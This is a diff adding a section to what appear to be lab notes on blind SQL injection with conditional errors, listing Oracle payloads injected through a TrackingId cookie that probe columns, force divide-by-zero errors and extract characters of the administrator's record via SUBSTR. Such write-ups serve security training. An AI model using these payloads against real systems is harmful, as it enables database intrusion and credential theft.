@@ -168,3 +168,25 @@ Run script:
 python3.9 blind-conditional-script-1.py
 ```
 
+## Blind SQL injection with conditional errors
+
+Same proccess as above. But this time TrackingId cookie behaves a bit differently:
+
+```
+'  // 500 response
+'--  // 200 response
+
+' union select NULL from dual--  // 200 response
+' union select NULL,NULL from dual--  // 500 response
+
+' union SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 500 response
+' union SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 200 response
+
+' union SELECT CASE WHEN ('a'=SUBSTR((SELECT username from users where username='administrator'),1,1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 500 response
+' union SELECT CASE WHEN ('b'=SUBSTR((SELECT username from users where username='administrator'),1,1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 200 response
+```
+
+Run script:
+```
+python3.9 blind-conditional-script-2.py
+```
